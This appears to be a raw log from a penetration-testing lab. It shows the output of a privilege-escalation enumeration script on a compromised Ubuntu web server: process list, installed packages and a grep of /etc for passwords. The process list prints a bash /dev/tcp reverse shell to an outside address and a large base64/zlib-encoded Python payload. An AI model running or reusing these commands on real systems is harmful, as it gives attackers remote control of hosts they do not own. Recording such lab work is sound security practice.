root        19     2  0 17:35 ?        00:00:00 [ata/0]
root        20     2  0 17:35 ?        00:00:00 [ata_aux]
root        21     2  0 17:35 ?        00:00:00 [ksuspend_usbd]
root        22     2  0 17:35 ?        00:00:00 [khubd]
root        23     2  0 17:35 ?        00:00:00 [kseriod]
root        24     2  0 17:35 ?        00:00:00 [kmmcd]
root        27     2  0 17:35 ?        00:00:00 [khungtaskd]
root        28     2  0 17:35 ?        00:00:00 [kswapd0]
root        29     2  0 17:35 ?        00:00:00 [ksmd]
root        30     2  0 17:35 ?        00:00:00 [aio/0]
root        31     2  0 17:35 ?        00:00:00 [ecryptfs-kthrea]
root        32     2  0 17:35 ?        00:00:00 [crypto/0]
root        35     2  0 17:35 ?        00:00:00 [pciehpd]
root        37     2  0 17:35 ?        00:00:00 [scsi_eh_0]
root        38     2  0 17:35 ?        00:00:00 [scsi_eh_1]
root        40     2  0 17:35 ?        00:00:00 [kstriped]
root        41     2  0 17:35 ?        00:00:00 [kmpathd/0]
root        42     2  0 17:35 ?        00:00:00 [kmpath_handlerd]
root        43     2  0 17:35 ?        00:00:00 [ksnapd]
root        44     2  0 17:35 ?        00:00:00 [kondemand/0]
root        45     2  0 17:35 ?        00:00:00 [kconservative/0]
root       140     2  0 17:35 ?        00:00:00 [mpt_poll_0]
root       188     2  0 17:35 ?        00:00:00 [mpt/0]
root       235     2  0 17:35 ?        00:00:00 [scsi_eh_2]
root       252     2  0 17:35 ?        00:00:00 [jbd2/sda1-8]
root       253     2  0 17:35 ?        00:00:00 [ext4-dio-unwrit]
root       313     1  0 17:36 ?        00:00:00 upstart-udev-bridge --daemon
root       315     1  0 17:36 ?        00:00:00 udevd --daemon
root       536     2  0 17:36 ?        00:00:00 [kpsmoused]
syslog     715     1  0 17:36 ?        00:00:00 rsyslogd -c4
102        716     1  0 17:36 ?        00:00:00 dbus-daemon --system --fork
root       731     1  0 17:36 ?        00:00:00 NetworkManager
avahi      735     1  0 17:36 ?        00:00:00 avahi-daemon: registering [offsecsrv.local]
avahi      738   735  0 17:36 ?        00:00:00 avahi-daemon: chroot helper
root       740     1  0 17:36 ?        00:00:00 /usr/sbin/modem-manager
root       752     1  0 17:36 ?        00:00:00 /sbin/wpa_supplicant -u -s
root       781     1  0 17:36 tty4     00:00:00 /sbin/getty -8 38400 tty4
root       788     1  0 17:36 tty5     00:00:00 /sbin/getty -8 38400 tty5
root       796     1  0 17:36 tty2     00:00:00 /sbin/getty -8 38400 tty2
root       797     1  0 17:36 tty3     00:00:00 /sbin/getty -8 38400 tty3
root       800     1  0 17:36 tty6     00:00:00 /sbin/getty -8 38400 tty6
root       801     1  0 17:36 ?        00:00:00 acpid -c /etc/acpi/events -s /var/run/acpid.socket
mysql      838     1  0 17:36 ?        00:00:00 /usr/sbin/mysqld
root       884     1  0 17:36 ?        00:00:00 /usr/sbin/cupsd -C /etc/cups/cupsd.conf
root       885     1  0 17:36 ?        00:00:00 cron
daemon     886     1  0 17:36 ?        00:00:00 atd
root       988     1  0 17:36 ?        00:00:00 /usr/sbin/apache2 -k start
root      1087     2  0 17:36 ?        00:00:00 [vmmemctl]
root      1194     1  0 17:36 tty1     00:00:00 /sbin/getty -8 38400 tty1
root      1317     1  0 17:36 ?        00:00:01 /usr/sbin/vmtoolsd
www-data  1579   988  0 17:42 ?        00:00:00 /usr/sbin/apache2 -k start
www-data  1580   988  0 17:42 ?        00:00:00 /usr/sbin/apache2 -k start
www-data  1581   988  0 17:42 ?        00:00:00 /usr/sbin/apache2 -k start
www-data  1582   988  0 17:42 ?        00:00:00 /usr/sbin/apache2 -k start
www-data  1583   988  0 17:42 ?        00:00:00 /usr/sbin/apache2 -k start
root      1883     1  0 18:08 ?        00:00:00 /usr/sbin/sshd -D
root      1897     2  0 18:08 ?        00:00:00 [flush-8:0]
www-data  1917   988  0 18:10 ?        00:00:00 /usr/sbin/apache2 -k start
www-data  1918  1583  0 18:11 ?        00:00:00 sh -c bash -c '0<&47-;exec 47<>/dev/tcp/192.168.45.151/443;sh <&47 >&47 2>&47'
www-data  1919  1918  0 18:11 ?        00:00:00 bash -c 0<&47-;exec 47<>/dev/tcp/192.168.45.151/443;sh <&47 >&47 2>&47
www-data  1920  1919  0 18:11 ?        00:00:00 sh
www-data  1948  1920  0 18:11 ?        00:00:00 /usr/bin/python -Wignore -c import base64,zlib;exec(zlib.decompress(base64.decodestring("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")))
www-data  1949  1948  0 18:11 pts/0    00:00:00 /bin/bash -i
www-data  1961  1949  0 18:15 pts/0    00:00:00 bash ./pg_privesc.sh
www-data  1963  1961  0 18:15 pts/0    00:00:00 bash ./pg_privesc.sh
www-data  1966  1963  0 18:15 pts/0    00:00:00 tee -a privesc_2026-01-20_181504.txt
www-data  2023  1961  0 18:15 pts/0    00:00:00 ps -ef

```

7.  Software / Packages

```
[+] dpkg -l (first 200)
$ dpkg -l 2>/dev/null | head -n 200
Desired=Unknown/Install/Remove/Purge/Hold
| Status=Not/Inst/Cfg-files/Unpacked/Failed-cfg/Half-inst/trig-aWait/Trig-pend
|/ Err?=(none)/Reinst-required (Status,Err: uppercase=bad)
||/ Name                                 Version                                         Description
+++-====================================-===============================================-============================================
ii  acpi-support                         0.136.1                                         scripts for handling many ACPI events
ii  acpid                                1.0.10-5ubuntu2.1                               Advanced Configuration and Power Interface e
ii  adduser                              3.112ubuntu1                                    add and remove users and groups
ii  adium-theme-ubuntu                   0.1-0ubuntu1                                    Adium message style for Ubuntu
ii  aisleriot                            1:2.30.0-0ubuntu6                               Solitaire card games
ii  alacarte                             0.13.1-0ubuntu1                                 easy GNOME menu editing tool
ii  alsa-base                            1.0.22.1+dfsg-0ubuntu3                          ALSA driver configuration files
ii  alsa-utils                           1.0.22-0ubuntu5                                 ALSA utilities
ii  anacron                              2.3-13.1ubuntu11                                cron-like program that doesn't go by time
ii  apache2                              2.2.14-5ubuntu8.6                               Apache HTTP Server metapackage
ii  apache2-mpm-prefork                  2.2.14-5ubuntu8.6                               Apache HTTP Server - traditional non-threade
ii  apache2-utils                        2.2.14-5ubuntu8.6                               utility programs for webservers
ii  apache2.2-bin                        2.2.14-5ubuntu8.6                               Apache HTTP Server common binary files
ii  apache2.2-common                     2.2.14-5ubuntu8.6                               Apache HTTP Server common files
ii  app-install-data                     0.10.04.7                                       Ubuntu applications (data files)
ii  app-install-data-partner             12.10.04.4                                      Application Installer (data files for partne
ii  apparmor                             2.5.1-0ubuntu0.10.04.3                          User-space parser utility for AppArmor
ii  apparmor-utils                       2.5.1-0ubuntu0.10.04.3                          Utilities for controlling AppArmor
ii  apport                               1.13.3-0ubuntu2                                 automatically generate crash reports for deb
ii  apport-gtk                           1.13.3-0ubuntu2                                 GTK+ frontend for the apport crash report sy
ii  apport-symptoms                      0.9                                             symptom scripts for apport
ii  apt                                  0.7.25.3ubuntu9.5                               Advanced front-end for dpkg
ii  apt-transport-https                  0.7.25.3ubuntu9.5                               APT https transport
ii  apt-utils                            0.7.25.3ubuntu9.5                               APT utility programs
ii  apt-xapian-index                     0.25ubuntu2                                     maintenance tools for a Xapian index of Debi
ii  aptdaemon                            0.11+bzr345-0ubuntu4.1                          transaction based package management service
ii  aptitude                             0.4.11.11-1ubuntu10                             terminal-based package manager
ii  apturl                               0.4.1ubuntu4.1                                  install packages using the apt protocol - GT
ii  apturl-common                        0.4.1ubuntu4.1                                  install packages using the apt protocol - co
ii  aspell                               0.60.6-3ubuntu1                                 GNU Aspell spell-checker
ii  aspell-en                            6.0-0-5.1ubuntu3                                English dictionary for GNU Aspell
ii  at                                   3.1.11-1ubuntu5.1                               Delayed job execution and batch processing
ii  at-spi                               1.30.1-0ubuntu1                                 Assistive Technology Service Provider Interf
ii  avahi-autoipd                        0.6.25-1ubuntu6.2                               Avahi IPv4LL network address configuration d
ii  avahi-daemon                         0.6.25-1ubuntu6.2                               Avahi mDNS/DNS-SD daemon
ii  avahi-utils                          0.6.25-1ubuntu6.2                               Avahi browsing, publishing and discovery uti
ii  base-files                           5.0.0ubuntu20.10.04.4                           Debian base system miscellaneous files
ii  base-passwd                          3.5.22                                          Debian base system master password and group
ii  bash                                 4.1-2ubuntu3                                    The GNU Bourne Again SHell
ii  bash-completion                      1:1.1-3ubuntu2                                  programmable completion for the bash shell
ii  bc                                   1.06.95-2                                       The GNU bc arbitrary precision calculator la
ii  bcmwl-modaliases                     5.60.48.36+bdcom-0ubuntu3                       Modaliases for the Broadcom 802.11 Linux STA
ii  bind9-host                           1:9.7.0.dfsg.P1-1ubuntu0.3                      Version of 'host' bundled with BIND 9.X
ii  binfmt-support                       1.2.18                                          Support for extra binary formats
ii  binutils                             2.20.1-3ubuntu7.1                               The GNU assembler, linker and binary utiliti
ii  bluez                                4.60-0ubuntu8                                   Bluetooth tools and daemons
ii  bluez-alsa                           4.60-0ubuntu8                                   Bluetooth audio support
ii  bluez-cups                           4.60-0ubuntu8                                   Bluetooth printer driver for CUPS
ii  bluez-gstreamer                      4.60-0ubuntu8                                   Bluetooth GStreamer support
ii  bogofilter                           1.2.1-0ubuntu1.1                                a fast Bayesian spam filter (dummy package)
ii  bogofilter-bdb                       1.2.1-0ubuntu1.1                                a fast Bayesian spam filter (Berkeley DB)
ii  bogofilter-common                    1.2.1-0ubuntu1.1                                a fast Bayesian spam filter (common files)
ii  branding-ubuntu                      0.4-0ubuntu1                                    Replacement artwork with Ubuntu branding
ii  brasero                              2.30.2-0ubuntu1.1                               CD/DVD burning application for GNOME
ii  brasero-common                       2.30.2-0ubuntu1.1                               Common files for the Brasero CD burning appl
ii  brltty                               4.1-2ubuntu6                                    Access software for a blind person using a b
ii  brltty-x11                           4.1-2ubuntu6                                    Access software for a blind person using a b
ii  bsdmainutils                         8.0.1ubuntu1                                    collection of more utilities from FreeBSD
ii  bsdutils                             1:2.17.2-0ubuntu1.10.04.2                       Basic utilities from 4.4BSD-Lite
ii  busybox-initramfs                    1:1.13.3-1ubuntu11                              Standalone shell setup for initramfs
ii  busybox-static                       1:1.13.3-1ubuntu11                              Standalone rescue shell with tons of builtin
ii  byobu                                2.68-0ubuntu1.1                                 a set of useful profiles and a profile-switc
ii  bzip2                                1.0.5-4ubuntu0.1                                high-quality block-sorting file compressor -
ii  ca-certificates                      20090814                                        Common CA certificates
ii  capplets-data                        1:2.30.1-0ubuntu1                               configuration applets for GNOME - data files
ii  cdparanoia                           3.10.2+debian-9                                 audio extraction tool for sampling CDs
ii  checkbox                             0.9.1                                           Checkbox System Testing
ii  checkbox-gtk                         0.9.1                                           Checkbox GTK Interface
ii  cli-common                           0.7                                             common files between all CLI packages
ii  command-not-found                    0.2.40ubuntu5                                   Suggest installation of packages in interact
ii  command-not-found-data               0.2.40ubuntu5                                   Set of data files for command-not-found.
ii  compiz                               1:0.8.4-0ubuntu15.3                             OpenGL window and compositing manager
ii  compiz-core                          1:0.8.4-0ubuntu15.3                             OpenGL window and compositing manager
ii  compiz-fusion-plugins-main           0.8.4-0ubuntu3                                  Collection of plugins from OpenCompositing f
ii  compiz-gnome                         1:0.8.4-0ubuntu15.3                             OpenGL window and compositing manager - GNOM
ii  compiz-plugins                       1:0.8.4-0ubuntu15.3                             OpenGL window and compositing manager - plug
ii  compizconfig-backend-gconf           0.8.4-0ubuntu2                                  Settings library for plugins - OpenCompositi
ii  computer-janitor                     1.14.1-0ubuntu2                                 clean up a system so it's more like a freshl
ii  computer-janitor-gtk                 1.14.1-0ubuntu2                                 clean up a system so it's more like a freshl
ii  console-setup                        1.34ubuntu15                                    console font and keymap setup program
ii  console-terminus                     4.30-2                                          Fixed-width fonts for fast reading on the Li
ii  consolekit                           0.4.1-3ubuntu2                                  framework for defining and tracking users, s
ii  coreutils                            7.4-2ubuntu3                                    The GNU core utilities
ii  couchdb-bin                          0.10.0-1ubuntu2                                 RESTful document oriented database, programs
ii  cpio                                 2.10-1ubuntu2                                   GNU cpio -- a program to manage archives of 
ii  cpp                                  4:4.4.3-1ubuntu1                                The GNU C preprocessor (cpp)
ii  cpp-4.4                              4.4.3-4ubuntu5                                  The GNU C preprocessor
ii  cpu-checker                          0.1-0ubuntu2                                    tools to help evaluate certain CPU (or BIOS)
ii  cron                                 3.0pl1-106ubuntu5                               process scheduling daemon
ii  cups                                 1.4.3-1ubuntu1.3                                Common UNIX Printing System(tm) - server
ii  cups-bsd                             1.4.3-1ubuntu1.3                                Common UNIX Printing System(tm) - BSD comman
ii  cups-client                          1.4.3-1ubuntu1.3                                Common UNIX Printing System(tm) - client pro
ii  cups-common                          1.4.3-1ubuntu1.3                                Common UNIX Printing System(tm) - common fil
ii  cups-driver-gutenprint               5.2.5-0ubuntu1.1                                printer drivers for CUPS
ii  dash                                 0.5.5.1-3ubuntu2                                POSIX-compliant shell
ii  dbus                                 1.2.16-2ubuntu4.2                               simple interprocess messaging system
ii  dbus-x11                             1.2.16-2ubuntu4.2                               simple interprocess messaging system (X11 de
ii  dc                                   1.06.95-2                                       The GNU dc arbitrary precision reverse-polis
ii  dcraw                                8.86-1build1                                    decode raw digital camera images
ii  debconf                              1.5.28ubuntu4                                   Debian configuration management system
ii  debconf-i18n                         1.5.28ubuntu4                                   full internationalization support for debcon
ii  debianutils                          3.2.2                                           Miscellaneous utilities specific to Debian
ii  defoma                               0.11.10-4ubuntu1                                Debian Font Manager -- automatic font config
ii  desktop-file-utils                   0.16-0ubuntu2                                   Utilities for .desktop files
ii  desktopcouch                         0.6.4-0ubuntu3.2                                A Desktop CouchDB instance
ii  dhcp3-client                         3.1.3-2ubuntu3.2                                DHCP client
ii  dhcp3-common                         3.1.3-2ubuntu3.2                                common files used by all the dhcp3* packages
ii  dictionaries-common                  1.4.0ubuntu2                                    Common utilities for spelling dictionary too
ii  diffutils                            1:2.8.1-18                                      File comparison utilities
ii  dmidecode                            2.9-1.2                                         Dump Desktop Management Interface data
ii  dmsetup                              2:1.02.39-1ubuntu4.1                            The Linux Kernel Device Mapper userspace lib
ii  dmz-cursor-theme                     0.4.1                                           Style neutral, scalable cursor theme
ii  dnsmasq-base                         2.52-1ubuntu0.1                                 A small caching DNS proxy and DHCP/TFTP serv
ii  dnsutils                             1:9.7.0.dfsg.P1-1ubuntu0.3                      Clients provided with BIND
ii  doc-base                             0.9.5                                           utilities to manage online documentation
ii  docbook-xml                          4.5-7                                           standard XML documentation system for softwa
ii  dosfstools                           3.0.7-1                                         utilities for making and checking MS-DOS FAT
ii  dpkg                                 1.15.5.6ubuntu4.5                               Debian package management system
ii  dvd+rw-tools                         7.1-6                                           DVD+-RW/R tools
ii  e2fslibs                             1.41.11-1ubuntu2.1                              ext2/ext3/ext4 file system libraries
ii  e2fsprogs                            1.41.11-1ubuntu2.1                              ext2/ext3/ext4 file system utilities
ii  ed                                   1.4-1build1                                     The classic UNIX line editor
ii  eject                                2.1.5+deb1+cvs20081104-7                        ejects CDs and operates CD-Changers under Li
ii  empathy                              2.30.3-0ubuntu1                                 GNOME multi-protocol chat and call client
ii  empathy-common                       2.30.3-0ubuntu1                                 GNOME multi-protocol chat and call client (c
ii  eog                                  2.30.0-0ubuntu1                                 Eye of GNOME graphics viewer program
ii  erlang-base                          1:13.b.3-dfsg-2ubuntu2.1                        Erlang/OTP virtual machine and base applicat
ii  erlang-crypto                        1:13.b.3-dfsg-2ubuntu2.1                        Erlang/OTP cryprographic modules
ii  erlang-inets                         1:13.b.3-dfsg-2ubuntu2.1                        Erlang/OTP Internet clients and servers
ii  erlang-mnesia                        1:13.b.3-dfsg-2ubuntu2.1                        Erlang/OTP distributed relational/object hyb
ii  erlang-public-key                    1:13.b.3-dfsg-2ubuntu2.1                        Erlang/OTP public key infrastructure
ii  erlang-runtime-tools                 1:13.b.3-dfsg-2ubuntu2.1                        Erlang/OTP runtime tracing/debugging tools
ii  erlang-ssl                           1:13.b.3-dfsg-2ubuntu2.1                        Erlang/OTP implementation of SSL
ii  erlang-syntax-tools                  1:13.b.3-dfsg-2ubuntu2.1                        Erlang/OTP modules for handling abstract Erl
ii  erlang-xmerl                         1:13.b.3-dfsg-2ubuntu2.1                        Erlang/OTP XML tools
ii  esound-clients                       0.2.41-6ubuntu1                                 Enlightened Sound Daemon - clients
ii  esound-common                        0.2.41-6ubuntu1                                 Enlightened Sound Daemon - Common files
ii  espeak                               1.43.03-0ubuntu1                                A multi-lingual software speech synthesizer
ii  espeak-data                          1.43.03-0ubuntu1                                A multi-lingual software speech synthesizer:
ii  evince                               2.30.3-0ubuntu1.2                               Document (postscript, pdf) viewer
ii  evolution                            2.28.3-0ubuntu10.3                              groupware suite with mail client and organiz
ii  evolution-common                     2.28.3-0ubuntu10.3                              architecture independent files for Evolution
ii  evolution-couchdb                    0.4.5-0ubuntu1                                  Evolution support for CouchDB databases
ii  evolution-data-server                2.28.3.1-0ubuntu5                               evolution database backend server
ii  evolution-data-server-common         2.28.3.1-0ubuntu5                               architecture independent files for Evolution
ii  evolution-exchange                   2.28.3-0ubuntu1                                 Exchange plugin for the Evolution groupware 
ii  evolution-indicator                  0.2.8-0ubuntu1                                  GNOME panel indicator applet for Evolution
ii  evolution-plugins                    2.28.3-0ubuntu10.3                              standard plugins for Evolution
ii  evolution-webcal                     2.28.0-1                                        webcal: URL handler for GNOME and Evolution
ii  example-content                      41                                              Ubuntu example content
ii  f-spot                               0.6.1.5-2ubuntu7                                personal photo management application
ii  fancontrol                           1:3.1.2-2                                       utilities to read temperature/voltage/fan se
ii  fglrx-modaliases                     2:8.723.1-0ubuntu5                              Identifiers supported by the ATI graphics dr
ii  file                                 5.03-5ubuntu1                                   Determines file type using "magic" numbers
ii  file-roller                          2.30.1.1-0ubuntu2                               an archive manager for GNOME
ii  findutils                            4.4.2-1ubuntu1                                  utilities for finding files--find, xargs
ii  finger                               0.17-13build1                                   user information lookup program
ii  firefox                              3.6.18+build2+nobinonly-0ubuntu0.10.04.2        safe and easy web browser from Mozilla
ii  firefox-branding                     3.6.18+build2+nobinonly-0ubuntu0.10.04.2        Package that ships the firefox branding
ii  firefox-gnome-support                3.6.18+build2+nobinonly-0ubuntu0.10.04.2        Support for GNOME in Mozilla Firefox
ii  fontconfig                           2.8.0-2ubuntu1                                  generic font configuration library - support
ii  fontconfig-config                    2.8.0-2ubuntu1                                  generic font configuration library - configu
ii  foo2zjs                              20100210-0ubuntu4                               Support for printing to ZjStream-based print
ii  foomatic-db                          20100216-0ubuntu3                               OpenPrinting printer support - database
ii  foomatic-db-engine                   4.0.4-0ubuntu1                                  OpenPrinting printer support - programs
ii  foomatic-filters                     4.0.4-0ubuntu1                                  OpenPrinting printer support - filters
ii  friendly-recovery                    0.2.10                                          Make recovery more user-friendly
ii  ftp                                  0.17-19build1                                   The FTP client
ii  fuse-utils                           2.8.1-1.1ubuntu3.1                              Filesystem in USErspace (utilities)
ii  gamin                                0.1.10-1ubuntu3                                 File and directory monitoring system
ii  gawk                                 1:3.1.6.dfsg-4build1                            GNU awk, a pattern scanning and processing l
ii  gbrainy                              1.41-1ubuntu1                                   brain teaser game and trainer to have fun an
ii  gcalctool                            5.30.0.is.5.28.2-0ubuntu2                       GNOME desktop calculator
ii  gcc                                  4:4.4.3-1ubuntu1                                The GNU C compiler
ii  gcc-4.4                              4.4.3-4ubuntu5                                  The GNU C compiler
ii  gcc-4.4-base                         4.4.3-4ubuntu5                                  The GNU Compiler Collection (base package)
ii  gconf-defaults-service               2.28.1-0ubuntu1                                 GNOME configuration database system (system 
ii  gconf-editor                         2.30.0-0ubuntu1                                 An editor for the GConf configuration system
ii  gconf2                               2.28.1-0ubuntu1                                 GNOME configuration database system (support
ii  gconf2-common                        2.28.1-0ubuntu1                                 GNOME configuration database system (common 
ii  gdb                                  7.1-1ubuntu2                                    The GNU Debugger
ii  gdebi                                0.6.0ubuntu2                                    Simple tool to install deb files - GNOME GUI
ii  gdebi-core                           0.6.0ubuntu2                                    Simple tool to install deb files
ii  gedit                                2.30.3-0ubuntu0.1                               official text editor of the GNOME desktop en
ii  gedit-common                         2.30.3-0ubuntu0.1                               official text editor of the GNOME desktop en
ii  genisoimage                          9:1.1.10-1ubuntu1                               Creates ISO-9660 CD-ROM filesystem images
ii  geoip-database                       1.4.6.dfsg-17                                   IP lookup command line tools that use the Ge
ii  gettext-base                         0.17-8ubuntu3                                   GNU Internationalization utilities for the b
ii  ghostscript                          8.71.dfsg.1-0ubuntu5.3                          The GPL Ghostscript PostScript/PDF interpret
ii  ghostscript-cups                     8.71.dfsg.1-0ubuntu5.3                          The GPL Ghostscript PostScript/PDF interpret
ii  ghostscript-x                        8.71.dfsg.1-0ubuntu5.3                          The GPL Ghostscript PostScript/PDF interpret
ii  gksu                                 2.0.2-2ubuntu2                                  graphical frontend to su
ii  gnome-about                          1:2.30.2-0ubuntu1                               The GNOME about box
ii  gnome-accessibility-themes           2.30.0-0ubuntu1                                 accessibility themes for the GNOME desktop
ii  gnome-applets                        2.30.0-0ubuntu2                                 Various applets for the GNOME panel - binary

```

8. Loot Files & Credentials

```
[+] grep password in /etc (first 50)
$ grep -R "password" /etc 2>/dev/null | head -n 50
/etc/ppp/options:# Don't show the passwords when logging the contents of PAP packets.
/etc/ppp/options:hide-password
/etc/ppp/options:# show the password string in the log message.
/etc/ppp/options:#show-password
/etc/ppp/options:# Use the system password database for authenticating the peer using
/etc/bash_completion.d/postgresql:            --username --password --echo --quiet --help --version' -- "$cur" ))
/etc/bash_completion.d/postgresql:            --host --port --username --password --interactive \
/etc/bash_completion.d/postgresql:            -W --password -x --expanded -X --no-psqlrc \
/etc/bash_completion.d/mailman:            --password -p --quiet -q -h --help' -- "$cur" ) )
/etc/bash_completion.d/mysqladmin:        password ping processlist reload refresh shutdown status variables \
/etc/bash_completion.d/samba:            --username -p --password -w --workgroup -n --nonprompt -d \
/etc/bash_completion.d/ldapvi:            --rename -h --host -D --user -w --password --bind \
/etc/bash_completion.d/heimdal:                options='-p --principal -V -e --enctype -w --password -r \
/etc/bash_completion.d/rsync:    --@(config|password-file|include-from|exclude-from))
/etc/bash_completion.d/rsync:            --log-format= --password-file= --bwlimit= \
/etc/bash_completion.d/shadow:        -c|--comment|-h|--help|-e|--expiredate|-f|--inactive|-k|--key|-p|--password|-u|--uid|-Z|--selinux-user)
/etc/bash_completion.d/shadow:            -p --password -r --system -s --shell -u --uid \
/etc/bash_completion.d/shadow:        -c|--comment|-d|--home|-e|--expiredate|-f|--inactive|-h|--help|-l|--login|-p|--password|-u|--uid|-Z|--selinux-user)
/etc/bash_completion.d/shadow:        # TODO: -U/--unlock, -p/--password, -L/--lock mutually exclusive
/etc/bash_completion.d/shadow:            -p --password -s --shell -u --uid -U --unlock \
/etc/bash_completion.d/shadow:        -g|--gid|-K|--key|-p|--password)
/etc/bash_completion.d/shadow:            -K --key -o --non-unique -p --password -r --system' \
/etc/bash_completion.d/shadow:        -g|--gid|-h|--help|-n|--new-name|-p|--password)
/etc/bash_completion.d/shadow:            -o --non-unique -p --password' -- "$cur" ) )
/etc/bash_completion.d/cvs:                # passwordless access to the remote repository
Binary file /etc/vmware-tools/plugins/common/libvix.so matches
/etc/X11/app-defaults/XScreenSaver-gl:! The format used for printing the date and time in the password dialog box
/etc/X11/app-defaults/XScreenSaver-gl:! Resources for the password and splash-screen dialog boxes of
/etc/X11/app-defaults/XScreenSaver-gl:*passwd.body.label:               Please enter your password.
/etc/X11/app-defaults/XScreenSaver:! The format used for printing the date and time in the password dialog box
/etc/X11/app-defaults/XScreenSaver:! Resources for the password and splash-screen dialog boxes of
/etc/X11/app-defaults/XScreenSaver:*passwd.body.label:          Please enter your password.
